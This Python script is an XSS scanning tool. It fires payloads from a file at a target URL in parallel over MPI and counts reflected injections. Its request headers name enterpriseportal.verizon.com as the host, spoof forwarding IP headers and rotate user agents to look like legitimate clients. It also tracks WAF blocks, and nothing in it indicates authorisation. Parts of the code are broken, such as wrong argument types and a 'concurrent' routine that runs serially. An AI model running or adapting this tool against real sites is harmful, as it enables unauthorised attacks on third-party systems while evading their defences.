import logging, os, random, re, requests, sys, time
from tqdm import tqdm
from urllib.parse import urljoin, urlencode
from concurrent.futures import ThreadPoolExecutor
from mpi4py import MPI
from colorama import Fore, Style


logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

MAX_ATTEMPTS = 1000

class XSSTester:
    def __init__(self, base_url, comm):
        self.base_url = base_url
        self.comm = comm
        self.total_payloads_tested = 0
        self.injected_payloads = 0
        self.not_injected_payloads = 0
        self.categories_tested = set()
        self.payloads_file = "xss_payloads.txt"  # Adjust the file path as needed

    def send_request(self, url):
        try:
            headers = {
                'User-Agent': self.generate_user_agent(),
                # Add headers to mimic legitimate clients
                'Host': 'enterpriseportal.verizon.com',
                'X-Forwarded-For': '1.1.1.1',
                'X-Forwarded-Proto': 'https',
                'X-Real-IP': '1.1.1.1',
                'X-Forwarded-Host': 'enterpriseportal.verizon.com',
                # Add more headers as needed based on the target server's requirements
            }
            response = requests.get(url, headers=headers)
            return response
        except requests.exceptions.RequestException as e:
            logger.error(f"Error sending request: {e}")
            return None

    def analyze_response(self, response, payload):
        self.total_payloads_tested += 1

        if response is None:
            logger.info("No response received.")
            return

        logger.info(f"Response for payload '{payload}':")
        logger.info(f"Response status code: {response.status_code}")

        if response.status_code == 403:
            logger.info("Request was blocked by WAF.")
            # Analyze HTML response for WAF details
            logger.debug(response.text)
        else:
            logger.info("Request was successful.")
            # Check response for indications of XSS vulnerability
            if self.is_xss_vulnerable(response.text):
                logger.warning("Potential XSS vulnerability detected.")
                self.injected_payloads += 1
            else:
                logger.info("No XSS vulnerability detected.")
                self.not_injected_payloads += 1

        # Extract payload category and update categories tested
        category = self.extract_category(payload)
        self.categories_tested.add(category)

    def extract_category(self, payload):
        # Placeholder function to extract category from the payload file
        # You may adjust this based on your payload file structure
        with open(self.payloads_file, "r") as file:
            for line in file:
                if isinstance(payload, str) and isinstance(line, str):
                    if payload in line:
                        category = line.split(":")[0].strip()  # Extract category from the line
                        return category
        # Return a default placeholder if category is not found
        return "CategoryPlaceholder"

    def is_xss_vulnerable(self, response_text):
        # Use regex to search for specific patterns indicative of XSS vulnerabilities
        xss_patterns = [
            r"<script>alert\('XSS'\);</script>",
            r"<img src=\"javascript:alert\('XSS'\)\">",
            # Add more patterns as needed
        ]
        for pattern in xss_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def generate_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
            # Add more user agents as needed
        ]
        return random.choice(user_agents)

    def fetch_xss_payloads(self):
        payloads = []

        if os.path.exists(self.payloads_file):
            with open(self.payloads_file, "r") as file:
                for line in file:
                    payloads.append(line.strip())
        else:
            logger.error(f"Payloads file '{self.payloads_file}' not found.")
        
        return payloads

    def test_payload(self, payload):
        payload = [('name', payload)]  # Convert payload to a sequence of two-element tuples
        url_with_payload = urljoin(self.base_url, f"?{urlencode(payload)}")
        response = self.send_request(url_with_payload)
        if response:
            self.analyze_response(response, payload)

    def test_payloads_concurrently(self, payloads):
        for payload in tqdm(payloads, desc="Progress"):
            self.test_payload(payload)

    def run_tests(self):
        payloads = self.fetch_xss_payloads()
        total_payloads = len(payloads)

        if total_payloads > 0:
            chunk_size = total_payloads // self.comm.Get_size()
            my_start = self.comm.Get_rank() * chunk_size
            my_end = (self.comm.Get_rank() + 1) * chunk_size if self.comm.Get_rank() < self.comm.Get_size() - 1 else total_payloads
            my_payloads = payloads[my_start:my_end]
            self.test_payloads_concurrently(my_payloads)

            # Gather results from all processes
            total_payloads_tested = self.comm.reduce(self.total_payloads_tested, op=MPI.SUM, root=0)
            injected_payloads = self.comm.reduce(self.injected_payloads, op=MPI.SUM, root=0)
            not_injected_payloads = self.comm.reduce(self.not_injected_payloads, op=MPI.SUM, root=0)
            categories_tested = self.comm.gather(self.categories_tested, root=0)

            if self.comm.Get_rank() == 0:
                # Combine categories from all processes
                combined_categories = set().union(*categories_tested)

                # Print summary statistics
                print("Summary:")
                print(f"Total payloads tested: {total_payloads_tested}")
                print(f"Injected payloads: {injected_payloads}")
                print(f"Not injected payloads: {not_injected_payloads}")
                print(f"Categories tested: {', '.join(combined_categories)}")
        else:
            logger.warning("No payloads found for testing.")

def main():
    comm = MPI.COMM_WORLD
    rank = comm.Get_rank()
    if len(sys.argv) != 2:
        if rank == 0:
            print("Usage: mpirun --use-hwthread-cpus python3.10 -m mpi4py ./xss_tester.py <base_url>")
    else:
        base_url = sys.argv[1]  # Base URL provided as command-line argument
        tester = XSSTester(base_url, comm)
        tester.run_tests()

if __name__ == "__main__":
    main()
